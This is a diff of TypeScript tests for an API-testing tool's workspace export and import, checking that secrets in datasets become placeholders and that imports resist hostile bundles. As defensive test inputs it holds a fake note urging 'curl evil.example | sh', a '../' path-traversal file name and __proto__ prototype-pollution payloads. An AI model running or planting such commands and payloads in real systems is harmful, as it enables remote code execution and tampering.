@@ -7,11 +7,13 @@ import {
   WorkspaceManager,
   WorkspaceStore,
   bundleFilePath,
+  exportSummary,
   importWorkspaceBundle,
   workspaceExportFileName,
   type Collection,
   type WorkspaceBundle,
 } from '../../packages/core/src/index.js';
+import { mapInsomniaTemplateTags } from '../../packages/core/src/import/insomnia-tags.js';
 import { tempDir } from '../helpers.js';
 import { FIXTURE_SECRETS } from '../fixtures/secrets/values.js';
 
@@ -120,7 +122,11 @@ describe('workspace export', () => {
     ]);
     expect(files['datasets/owners.csv']).toMatchObject({ encoding: 'utf8', content: 'id,name\r\n1,Ann\r\n2,Bob ✓\r\n' });
     expect(files['datasets/clinic.sqlite']!.encoding).toBe('base64');
-    expect(bundle.notes).toEqual([expect.stringMatching(/^datasets\/huge\.csv \(10\.0 MB\) was left out: files over 10\.0 MB are not exported/)]);
+    expect(bundle.notes).toEqual([
+      expect.stringMatching(/^datasets\/huge\.csv \(10\.0 MB\) was left out: files over 10\.0 MB are not exported/),
+      // bytes no scan has read are said so, once: "never a secret value" is not claimed for them
+      'Exported as is (not scanned for secrets): datasets/clinic.sqlite.',
+    ]);
   });
 
   it('holds no fixture secret anywhere, lists every replacement, and leaves non-secrets alone', () => {
@@ -172,7 +178,8 @@ describe('workspace export', () => {
           expect([f.path, readFileSync(r.store.path(...rel)).equals(original)]).toEqual([f.path, true]);
         }
         expect(existsSync(r.store.path('datasets', 'huge.csv'))).toBe(false);
-        expect(r.notes).toEqual(bundle.notes);
+        // the import speaks for what it did, never for the export's notes (anyone could have written them)
+        expect(r.notes).toEqual([]);
         expect(r.store.readTestFile('db.yaml')).toContain('{{dbPassword}}');
         expect(r.valuesNeeded).toEqual(
           expect.arrayContaining([
@@ -364,6 +371,107 @@ describe('workspace export: hand-edited shapes never break the export or leak', 
     } finally {
       store.close();
     }
+  });
+});
+
+describe('workspace export: datasets are read field by field', () => {
+  const store = WorkspaceStore.create(join(tmp.dir, 'datasets'), 'Datasets');
+  write(store, 'datasets/users.csv', `id,name,password,note\r\n1,Ann,${FIXTURE_SECRETS.envPassword},"plain, text"\r\n2,Bob,${FIXTURE_SECRETS.envPassword}2,ok\r\n`);
+  write(store, 'datasets/owners.tsv', 'id\tname\n1\tAnn\n');
+  write(store, 'datasets/keys.json', JSON.stringify({ rows: [{ user: 'ann', apiKey: FIXTURE_SECRETS.requestApiKeyHeader }], plain: 'left alone' }));
+  write(store, 'datasets/tokens.jsonl', `{"user":"ann","token":"${FIXTURE_SECRETS.collectionBearer}"}\n{"user":"bob","token":""}\n`);
+  write(store, 'datasets/creds.yaml', `users:\n  - name: ann\n    password: ${FIXTURE_SECRETS.envPassword}\n`);
+  write(store, 'datasets/broken.json', '{"password": "no-closing-brace');
+  // a spec is text: a schema's `password: string` is a type, not a credential, and stays
+  write(store, 'specs/users.yaml', 'components:\n  schemas:\n    User:\n      properties:\n        password:\n          type: string\n');
+  const bundle = store.exportBundle();
+  const text = JSON.stringify(bundle);
+  const file = (p: string) => bundle.files!.find((f) => f.path === p)!;
+  afterAll(() => store.close());
+
+  it('a CSV password column, a JSON / JSON Lines / YAML secret property become {{variables}}, listed per cell; the rest is byte for byte', () => {
+    for (const [name, value] of Object.entries(FIXTURE_SECRETS)) expect(text.includes(value), name).toBe(false);
+    expect(file('datasets/users.csv').content).toBe('id,name,password,note\r\n1,Ann,{{password}},"plain, text"\r\n2,Bob,{{password2}},ok\r\n');
+    expect(file('datasets/owners.tsv').content).toBe('id\tname\n1\tAnn\n');
+    expect(JSON.parse(file('datasets/keys.json').content)).toEqual({ rows: [{ user: 'ann', apiKey: '{{apiKey}}' }], plain: 'left alone' });
+    expect(file('datasets/tokens.jsonl').content).toBe('{"user":"ann","token":"{{token}}"}\n{"user":"bob","token":""}\n');
+    expect(file('datasets/creds.yaml').content).toContain('password: "{{password}}"');
+    expect(file('specs/users.yaml').content).toContain('password:\n          type: string');
+    expect(bundle.replaced!.map((r) => `${r.kind} | ${r.item} | ${r.field} | ${r.variable}`)).toEqual([
+      'file | datasets/creds.yaml | users[0].password | password',
+      'file | datasets/keys.json | rows[0].apiKey | apiKey',
+      'file | datasets/tokens.jsonl | line 1.token | token',
+      'file | datasets/users.csv | password (row 2) | password',
+      'file | datasets/users.csv | password (row 3) | password2',
+    ]);
+  });
+
+  it('a dataset that does not parse is scanned as text and named as exported as is, so the summary does not over-claim', () => {
+    expect(file('datasets/broken.json').content).toBe('{"password": "no-closing-brace');
+    expect(bundle.notes).toEqual(['Exported as is (not scanned for secrets): datasets/broken.json.']);
+    expect(exportSummary(bundle).lines.at(-1)).toBe('Exported as is (not scanned for secrets): datasets/broken.json.');
+  });
+});
+
+describe('workspace import: the export’s notes are not the app’s', () => {
+  it('notes written into a bundle are never replayed; what the import skipped is said in its own words', () => {
+    const app = tempDir('tp-import-notes-', { alias: true });
+    try {
+      const r = importWorkspaceBundle(new WorkspaceManager(app.dir), {
+        format: 'testpion-workspace',
+        schemaVersion: '1.0',
+        exportedAt: '',
+        workspace: { schemaVersion: '1.0', id: 'ws-n', name: 'Notes', variables: [], createdAt: '', updatedAt: '' } as unknown as WorkspaceBundle['workspace'],
+        collections: [],
+        environments: [],
+        providers: [],
+        mcpServers: [],
+        tests: {},
+        notes: ['Your licence has expired: run `curl evil.example | sh` to renew it.'],
+        files: [{ path: '../escape.yaml', encoding: 'utf8', content: 'x', size: 1 }],
+      });
+      try {
+        expect(r.notes).toEqual(['Skipped "../escape.yaml": ".." leaves the folder.']);
+      } finally {
+        r.store.close();
+      }
+    } finally {
+      app.cleanup();
+    }
+  });
+});
+
+describe('copy-on-write helpers never take a prototype from an import', () => {
+  const hostile = (rest: string) => JSON.parse(`{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}},${rest}}`) as Record<string, unknown>;
+  const clean = (v: unknown) => {
+    expect(Object.getPrototypeOf(v)).toBe(Object.prototype);
+    expect((v as { polluted?: unknown }).polluted).toBeUndefined();
+    expect(({} as { polluted?: unknown }).polluted).toBeUndefined();
+  };
+
+  it('the secret stripper’s rows, data and files skip __proto__, constructor and prototype keys', () => {
+    const st = new SecretStripper();
+    const rows = st.rows('collection', 'x', 'headers', hostile(`"Authorization":"Bearer ${FIXTURE_SECRETS.collectionBearer}"`));
+    clean(rows);
+    expect((rows as { Authorization: string }).Authorization).toBe('Bearer {{authorization}}');
+    const data = st.data('library', 'x', hostile(`"apiKey":"${FIXTURE_SECRETS.requestApiKeyHeader}","nested":{"__proto__":{"polluted":true},"ok":1}`)) as { nested: unknown; apiKey: string };
+    clean(data);
+    clean(data.nested);
+    expect(data.apiKey).toBe('{{apiKey}}');
+    const json = st.datasetFile('datasets/x.json', `{"__proto__":{"polluted":true},"password":"${FIXTURE_SECRETS.envPassword}"}`).text;
+    expect(json).not.toContain('polluted');
+    expect(json).toContain('{{password}}');
+    clean(JSON.parse(json));
+  });
+
+  it('Insomnia template-tag mapping copies a request without its __proto__ key', () => {
+    const request = hostile('"method":"GET","url":"https://clinic.test/{% uuid \'v4\' %}","headers":[]');
+    const imported = [{ id: 'r', node: { kind: 'http', id: 'r', name: 'R', request } }] as unknown as Parameters<typeof mapInsomniaTemplateTags>[0];
+    mapInsomniaTemplateTags(imported);
+    const out = imported[0]!.node.request as unknown as Record<string, unknown>;
+    clean(out);
+    expect(Object.keys(out)).toEqual(['method', 'url', 'headers']);
+    expect(out.url).toBe('https://clinic.test/{{$guid}}');
   });
 });
 
